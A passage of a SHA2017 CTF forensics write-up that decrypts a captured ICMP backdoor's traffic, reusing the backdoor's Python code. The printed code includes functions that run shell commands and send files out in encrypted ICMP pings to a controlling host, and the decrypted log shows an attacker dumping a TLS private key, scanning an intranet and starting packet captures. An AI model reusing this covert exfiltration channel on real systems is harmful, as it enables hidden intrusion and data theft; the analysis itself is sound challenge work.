class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import base64</div><div class="line">import sys</div><div class="line">import time</div><div class="line">import subprocess</div><div class="line">import threading</div><div class="line"></div><div class="line">from Crypto import Random</div><div class="line">from Crypto.Cipher import AES</div><div class="line">import binascii</div><div class="line">import re</div><div class="line"></div><div class="line">BS = 16</div><div class="line">pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</div><div class="line">unpad = lambda s : s[0:-ord(s[-1])]</div><div class="line">magic = <span class="string">"SHA2017"</span></div><div class="line">key2=<span class="string">"K8djhaIU8H2d1jNb"</span></div><div class="line">stri=<span class="string">"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ=="</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">class AESCipher:</div><div class="line"></div><div class="line">    def __init__( self, key ):</div><div class="line">        self.key = key</div><div class="line"></div><div class="line">    def encrypt( self, raw ):</div><div class="line">        raw = pad(raw)</div><div class="line">        iv = Random.new().<span class="built_in">read</span>( AES.block_size )</div><div class="line">        cipher = AES.new( self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="built_in">return</span> base64.b64encode( iv + cipher.encrypt( raw ) )</div><div class="line"></div><div class="line">    def decrypt( self, enc ):</div><div class="line">        enc = base64.b64decode(enc)</div><div class="line">        iv = enc[:16]</div><div class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="built_in">return</span> unpad(cipher.decrypt( enc[16:] ))</div><div class="line"></div><div class="line">def run_command(cmd):</div><div class="line">    ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</div><div class="line">    output = ps.communicate()[0]</div><div class="line">    <span class="built_in">return</span> output</div><div class="line"></div><div class="line">def send_ping(host, magic, data):</div><div class="line">    data = cipher.encrypt(data)</div><div class="line">    load = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(magic, data)</div><div class="line">    time.sleep(1)</div><div class="line">    sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)</div><div class="line"></div><div class="line">def chunks(L, n):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(0, len(L), n):</div><div class="line">        yield L[i:i+n]</div><div class="line"></div><div class="line">def get_file(host, magic, fn):</div><div class="line">    time.sleep(1)</div><div class="line">    data = base64.urlsafe_b64encode(open(fn, <span class="string">"rb"</span>).<span class="built_in">read</span>())</div><div class="line">    cnt = 0</div><div class="line">    icmp_threads = []</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> chunks(data, 500):</div><div class="line">        t = threading.Thread(target = send_ping, args = (host,magic, <span class="string">"getfile:&#123;&#125;:&#123;&#125;"</span>.format(cnt,line)))</div><div class="line">        t.daemon = True</div><div class="line">        t.start()</div><div class="line">        icmp_threads.append(t)</div><div class="line">        cnt += 1</div><div class="line"></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> icmp_threads:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># cipher = AESCipher(sys.argv[1])</span></div><div class="line"></div><div class="line"><span class="comment"># while True:</span></div><div class="line"><span class="comment">#     try: </span></div><div class="line"><span class="comment">#         pkts = sniff(filter="icmp", timeout =5,count=1)</span></div><div class="line"></div><div class="line"><span class="comment">#         for packet in pkts:</span></div><div class="line"><span class="comment">#              if  str(packet.getlayer(ICMP).type) == "8": </span></div><div class="line"><span class="comment">#                 input = packet[IP].load</span></div><div class="line"><span class="comment">#                 if input[0:len(magic)] == magic:</span></div><div class="line"><span class="comment">#                     input = input.split(":")</span></div><div class="line"><span class="comment">#                     data = cipher.decrypt(input[1]).split(":")</span></div><div class="line"><span class="comment">#                     ip = packet[IP].src</span></div><div class="line"><span class="comment">#                     if data[0] == "command":</span></div><div class="line"><span class="comment">#                         output = run_command(data[1])</span></div><div class="line"><span class="comment">#                         send_ping(ip, magic, "command:&#123;&#125;".format(output))</span></div><div class="line"><span class="comment">#                     if data[0] == "getfile":</span></div><div class="line"><span class="comment">#                         #print "[+] Sending file &#123;&#125;".format(data[1])</span></div><div class="line"><span class="comment">#                         get_file(ip, magic, data[1])</span></div><div class="line"><span class="comment">#     except:</span></div><div class="line"><span class="comment">#         pass</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#   break</span></div><div class="line"><span class="comment"># print(final)</span></div><div class="line"></div><div class="line"><span class="comment">#for i in range(0,301):</span></div><div class="line"><span class="comment">#   print(i, dicio[str(i)])</span></div><div class="line"><span class="comment"># for k,v in dicio.iteritems():</span></div><div class="line">    <span class="comment"># print(k, base64.urlsafe_b64decode(v))</span></div><div class="line"></div><div class="line"><span class="comment"># print(base64.urlsafe_b64decode(final))</span></div><div class="line"></div><div class="line">    <span class="comment"># if outp not in lis:</span></div><div class="line">    <span class="comment">#     # print(outp)</span></div><div class="line">        </div><div class="line">    <span class="comment">#     print(numb)</span></div><div class="line">    <span class="comment">#     lis.append(outp)</span></div><div class="line">        </div><div class="line">  <span class="comment"># lis = sorted(lis)</span></div><div class="line">  <span class="comment"># for it in lis:</span></div><div class="line">    <span class="comment"># print(it)</span></div><div class="line"></div><div class="line"></div><div class="line">dicio = &#123;&#125;</div><div class="line">lis = []</div><div class="line">n = AESCipher(key2)</div><div class="line">infile1=<span class="string">"encrypted1"</span></div><div class="line">with open(infile1) as f:</div><div class="line">  strin = f.read().split(<span class="string">'SHA2017:'</span>)</div><div class="line">  strin = strin[1:]</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(strin),2):</div><div class="line">    outp = n.decrypt(strin[i])</div><div class="line">    <span class="built_in">print</span> outp</div></pre></td></tr></table></figure>
<p>Running the script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.py</div><div class="line"><span class="built_in">command</span>:ls -la</div><div class="line"><span class="built_in">command</span>:total 16</div><div class="line">drwxr-xr-x 3 root     root     4096 Jul 26 09:36 .</div><div class="line">drwxr-xr-x 3 root     root     4096 Jul 26 03:45 ..</div><div class="line">drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css</div><div class="line">-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.php</div><div class="line"></div><div class="line"><span class="built_in">command</span>:id</div><div class="line"><span class="built_in">command</span>:uid=0(root) gid=0(root) groups=0(root)</div><div class="line"></div><div class="line"><span class="built_in">command</span>:id</div><div class="line"><span class="built_in">command</span>:uid=0(root) gid=0(root) groups=0(root)</div><div class="line"></div><div class="line"><span class="built_in">command</span>:id</div><div class="line"><span class="built_in">command</span>:uid=0(root) gid=0(root) groups=0(root)</div><div class="line"></div><div class="line"><span class="built_in">command</span>:ls -la /root</div><div class="line"><span class="built_in">command</span>:total 32</div><div class="line">drwx------  5 root root 4096 Jul 27 07:27 .</div><div class="line">drwxr-xr-x 22 root root 4096 Apr 18 05:43 ..</div><div class="line">-rw-------  1 root root 3228 Jul 26 06:44 .bash_history</div><div class="line">-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc</div><div class="line">drwxr-xr-x  2 root root 4096 Jul 27 09:11 certs</div><div class="line">drwxr-xr-x  2 root root 4096 Jul 26 03:47 .nano</div><div class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</div><div class="line">drwx------  2 root root 4096 Jul 27 07:27 .ssh</div><div class="line"></div><div class="line"><span class="built_in">command</span>:ls -la /root/certs</div><div class="line"><span class="built_in">command</span>:total 16</div><div class="line">drwxr-xr-x 2 root root 4096 Jul 27 09:11 .</div><div class="line">drwx------ 5 root root 4096 Jul 27 07:27 ..</div><div class="line">-rw-r--r-- 1 root root  989 Jul 27 07:23 intranet.crt</div><div class="line">-rw-r--r-- 1 root root  916 Jul 27 07:23 intranet.key</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /root/certs/intranet.crt</div><div class="line"><span class="built_in">command</span>:-----BEGIN CERTIFICATE-----</div><div class="line">MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNV</div><div class="line">BAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQw</div><div class="line">EgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBn</div><div class="line">bWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYD</div><div class="line">VQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEU</div><div class="line">MBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZA</div><div class="line">Z21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRn</div><div class="line">n/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXK</div><div class="line">hCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgK</div><div class="line">hNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7M</div><div class="line">V70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMw</div><div class="line">DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAW</div><div class="line">rjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDu</div><div class="line">SRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nX</div><div class="line">DkYKgl7BR0a72yTuLAc0GA==</div><div class="line">-----END CERTIFICATE-----</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /root/certs/intranet.key</div><div class="line"><span class="built_in">command</span>:-----BEGIN PRIVATE KEY-----</div><div class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef</div><div class="line">/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE</div><div class="line">KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE</div><div class="line">3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W</div><div class="line">8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449</div><div class="line">kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE</div><div class="line">pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW</div><div class="line">BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP</div><div class="line">dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO</div><div class="line">HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ</div><div class="line">IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni</div><div class="line">+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa</div><div class="line">ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER</div><div class="line">iuSWkHY6ll1V1m0=</div><div class="line">-----END PRIVATE KEY-----</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /root/certs/intranet.key</div><div class="line"><span class="built_in">command</span>:-----BEGIN PRIVATE KEY-----</div><div class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef</div><div class="line">/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE</div><div class="line">KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE</div><div class="line">3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W</div><div class="line">8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449</div><div class="line">kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE</div><div class="line">pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW</div><div class="line">BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP</div><div class="line">dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO</div><div class="line">HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ</div><div class="line">IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni</div><div class="line">+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa</div><div class="line">ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER</div><div class="line">iuSWkHY6ll1V1m0=</div><div class="line">-----END PRIVATE KEY-----</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /etc/hosts</div><div class="line"><span class="built_in">command</span>:127.0.0.1 localhost</div><div class="line">127.0.1.1 ubuntu</div><div class="line"></div><div class="line"><span class="comment"># The following lines are desirable for IPv6 capable hosts</span></div><div class="line">::1     localhost ip6-localhost ip6-loopback</div><div class="line">ff02::1 ip6-allnodes</div><div class="line">ff02::2 ip6-allrouters</div><div class="line">10.29.0.1 router</div><div class="line">192.168.1.1     router</div><div class="line">192.168.1.2     intranet</div><div class="line"></div><div class="line"><span class="built_in">command</span>:nohup nmap intranet &gt; /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line"><span class="built_in">command</span>:cat /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</div><div class="line">Nmap scan report <span class="keyword">for</span> intranet (192.168.1.2)</div><div class="line">Host is up (0.00010s latency).</div><div class="line">Not shown: 997 closed ports</div><div class="line">PORT    STATE SERVICE</div><div class="line">22/tcp  open  ssh</div><div class="line">80/tcp  open  http</div><div class="line">443/tcp open  https</div><div class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</div><div class="line"></div><div class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.52 seconds</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</div><div class="line">Nmap scan report <span class="keyword">for</span> intranet (192.168.1.2)</div><div class="line">Host is up (0.00010s latency).</div><div class="line">Not shown: 997 closed ports</div><div class="line">PORT    STATE SERVICE</div><div class="line">22/tcp  open  ssh</div><div class="line">80/tcp  open  http</div><div class="line">443/tcp open  https</div><div class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</div><div class="line"></div><div class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.52 seconds</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</div><div class="line">Nmap scan report <span class="keyword">for</span> intranet (192.168.1.2)</div><div class="line">Host is up (0.00010s latency).</div><div class="line">Not shown: 997 closed ports</div><div class="line">PORT    STATE SERVICE</div><div class="line">22/tcp  open  ssh</div><div class="line">80/tcp  open  http</div><div class="line">443/tcp open  https</div><div class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</div><div class="line"></div><div class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.52 seconds</div><div class="line"></div><div class="line"><span class="built_in">command</span>:cat /tmp/intranet.nmap</div><div class="line"><span class="built_in">command</span>:</div><div class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT</div><div class="line">Nmap scan report <span class="keyword">for</span> intranet (192.168.1.2)</div><div class="line">Host is up (0.00010s latency).</div><div class="line">Not shown: 997 closed ports</div><div class="line">PORT    STATE SERVICE</div><div class="line">22/tcp  open  ssh</div><div class="line">80/tcp  open  http</div><div class="line">443/tcp open  https</div><div class="line">MAC Address: 00:0C:29:3D:FD:B0 (VMware)</div><div class="line"></div><div class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.52 seconds</div><div class="line"></div><div class="line"><span class="built_in">command</span>:curl -k https://intranet/</div><div class="line"><span class="built_in">command</span>:  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div class="line">                                 Dload  Upload   Total   Spent    Left  Speed</div><div class="line">100   456  100   456    0     0   4871      0 --:--:-- --:--:-- --:--:--  4903</div><div class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;401 Unauthorized&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Unauthorized&lt;/h1&gt;</div><div class="line">&lt;p&gt;This server could not verify that you</div><div class="line">are authorized to access the document</div><div class="line">requested.  Either you supplied the wrong</div><div class="line">credentials (e.g., bad password), or your</div><div class="line">browser doesn<span class="string">'t understand how to supply</span></div><div class="line"><span class="string">the credentials required.&lt;/p&gt;</span></div><div class="line"><span class="string">&lt;hr&gt;</span></div><div class="line"><span class="string">&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at intranet Port 443&lt;/address&gt;</span></div><div class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">command:tcpdump -D</span></div><div class="line"><span class="string">command:1.ens33 [Up, Running]</span></div><div class="line"><span class="string">2.ens39 [Up, Running]</span></div><div class="line"><span class="string">3.any (Pseudo-device that captures on all interfaces) [Up, Running]</span></div><div class="line"><span class="string">4.lo [Up, Running, Loopback]</span></div><div class="line"><span class="string">5.nflog (Linux netfilter log (NFLOG) interface)</span></div><div class="line"><span class="string">6.nfqueue (Linux netfilter queue (NFQUEUE) interface)</span></div><div class="line"><span class="string">7.usbmon1 (USB bus number 1)</span></div><div class="line"><span class="string">8.usbmon2 (USB bus number 2)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">command:tcpdump -i usbmon2 -w /tmp/usb.pcap</span></div><div class="line"><span class="string">command:tcpdump host intranet -w /tmp/intranet.pcap</span></div></pre></td></tr></table></figure>
<p>As we can see we can extract alot of usefull Information from here, we now have the RSA private key used for TLS encryption and the certificate from the companies intranet website, the last 2 commands we could see that the hacker actually started two tcpdumps initiating the captures and one of them is a USB capture! maybe this will be useful latter!<br>Usefull data extracted:</p>
<blockquote><br>command:cat /root/certs/intranet.crt<br>command:—–BEGIN CERTIFICATE—–<br>MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNV<br>BAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQw<br>EgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBn<br>bWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYD<br>VQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEU<br>MBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZA<br>Z21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRn<br>n/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXK<br>hCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgK<br>hNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7M<br>V70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMw<br>DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAW<br>rjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDu<br>SRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nX<br>DkYKgl7BR0a72yTuLAc0GA==<br>—–END CERTIFICATE—–<br><br>command:cat /root/certs/intranet.key<br>command:—–BEGIN PRIVATE KEY—–<br>MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef<br>/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE<br>KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE<br>3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W<br>8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449<br>kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE<br>pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW<br>BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP<br>dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO<br>HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ<br>IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni<br>+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa<br>ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER<br>iuSWkHY6ll1V1m0=<br>—–END PRIVATE KEY—–<br><br>command:tcpdump -i usbmon2 -w /tmp/usb.pcap<br>command:tcpdump host intranet -w /tmp/intranet.pcap<br><br></blockquote>

<p>Now doing the same thing for the 2nd PCAP capture by adding this to the previous backdoor.py script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">infile1=<span class="string">"encrypted2"</span></div><div class="line"><span class="keyword">with</span> open(infile1) <span class="keyword">as</span> f:</div><div class="line">  strin = f.read().split(<span class="string">'SHA2017:'</span>)</div><div class="line">  strin = strin[<span class="number">1</span>:]</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(strin)):</div><div class="line">    outp = n.decrypt(strin[i])</div><div class="line">    <span class="keyword">print</span> outp</div></pre></td></tr></table></figure>
